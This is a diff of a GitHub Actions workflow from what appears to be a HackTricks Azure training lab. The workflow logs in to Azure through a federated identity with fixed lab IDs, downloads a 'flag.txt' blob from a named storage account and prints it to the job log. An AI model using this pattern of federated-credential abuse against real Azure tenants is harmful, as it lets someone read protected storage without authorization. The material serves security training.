@@ -1,22 +1,30 @@
 name: Deploy to Azure
-on:
-  push: { branches: [main] }
+on: [workflow_dispatch]
+
 permissions:
   id-token: write
   contents: read
+
 jobs:
   get-flag:
     runs-on: ubuntu-latest
     steps:
-      - name: Az CLI login
+      - name: Azure login
         uses: azure/login@v1
         with:
-          client-id: "a74cb5d2-4e28-4216-bb35-4cedf6ee9475"
-          tenant-id: "azure.training.hacktricks.xyz"
-          subscription-id: "764cc28a-0e45-4d5b-aca7-a1baf16a334b"
+          client-id: a74cb5d2-4e28-4216-bb35-4cedf6ee9475
+          tenant-id: fdd066e1-ee37-49bc-b08f-d0e152119b04
+          subscription-id: 764cc28a-0e45-4d5b-aca7-a1baf16a334b
           enable-AzPSSession: true
+
       - name: Download flag
         run: |
-          az storage blob download --account-name iamazurelab39f82a4ba  --container-name flag --name flag.txt --file flag.txt --auth-mode login
+          az storage blob download \
+            --account-name iamazurelab39f82a4ba \
+            --container-name flag \
+            --name flag.txt \
+            --file flag.txt \
+            --auth-mode login
       - name: Read flag
-        run: cat flag.txt
+        run: |
+          cat flag.txt
